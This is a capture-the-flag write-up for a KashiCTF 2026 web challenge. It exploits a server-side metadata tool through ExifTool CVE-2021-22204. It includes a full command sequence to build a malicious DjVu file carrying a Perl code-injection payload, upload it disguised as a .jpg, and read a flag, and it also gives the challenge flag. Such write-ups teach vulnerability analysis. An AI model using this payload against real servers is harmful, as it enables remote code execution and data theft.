# Hidden Secrets — KashiCTF 2026

| Field | Value |
|-------|-------|
| **Category** | Web |
| **Points** | 366 |
| **Author** | Aerex |
| **Flag** | `kashiCTF{SwVe1eMDJeVxqEiiuvaX5Xsi6CuXqXnDy1Ljrt0jbiLLKNrv4kRDi7DZbecm87Xa}` |

## Description

> We intercepted this image from a suspicious source. Our analysts believe there's more to it than meets the eye. Can you extract any hidden information?
> The system administrators have set up a metadata extraction tool for analysis. Use it wisely.

## TL;DR

ExifTool 12.23 is vulnerable to CVE-2021-22204 (arbitrary code execution via DjVu annotations). Craft a DjVu file with `\c${system('cmd')}` in a metadata annotation, upload it, and the server executes the command.

## Analysis

The web app accepts image uploads and runs ExifTool to extract metadata. A normal PNG upload reveals:

```
ExifTool Version Number : 12.23
```

ExifTool 12.23 is vulnerable to **CVE-2021-22204** — arbitrary code execution through crafted DjVu file annotations. The vulnerability was patched in version 12.24.

## Exploitation

### CVE-2021-22204

The vulnerability is in ExifTool's DjVu annotation parser. When processing certain escape sequences in DjVu metadata, ExifTool evaluates them as Perl code. Specifically, the `\c` escape followed by `${}` triggers Perl interpolation.

### Building the Exploit

```bash
# Create minimal DjVu base
echo "P1 1 1 0" > min.pbm
cjb2 min.pbm base.djvu
djvuextract base.djvu Sjbz=sjbz.chunk

# Create malicious annotation with Perl code injection
echo -n '(metadata "\c${system('\''cat /flag*'\'')}")' > exploit.chunk

# Build exploit DjVu
djvumake exploit.djvu INFO=1,1,300 Sjbz=sjbz.chunk ANTa=exploit.chunk

# Upload (renamed to .jpg to pass file type filter)
curl -X POST -F "file=@exploit.djvu;filename=x.jpg" http://TARGET/
```

### Key Detail

The payload format that triggers the eval is:

```
(metadata "\c${system('COMMAND')}")
```

The `\c` escape sequence is critical — it triggers ExifTool's Perl string interpolation path in the DjVu annotation parser. Without `\c`, the `${}` expression is treated as a literal string.

Other formats that do NOT work (tested):
- `(metadata (Copyright "\n" . qx{cmd} . "\n"))` — concatenation not eval'd
- `(metadata (Copyright "\n" . (2+2) . "\n"))` — arithmetic not eval'd
- `(metadata (Copyright "\n" . system("cmd") . "\n"))` — function call not eval'd

### Result

The server executes `cat /flag*` and outputs:

```
kashiCTF{SwVe1eMDJeVxqEiiuvaX5Xsi6CuXqXnDy1Ljrt0jbiLLKNrv4kRDi7DZbecm87Xa}
```

## Files

- `flag.txt` — captured flag
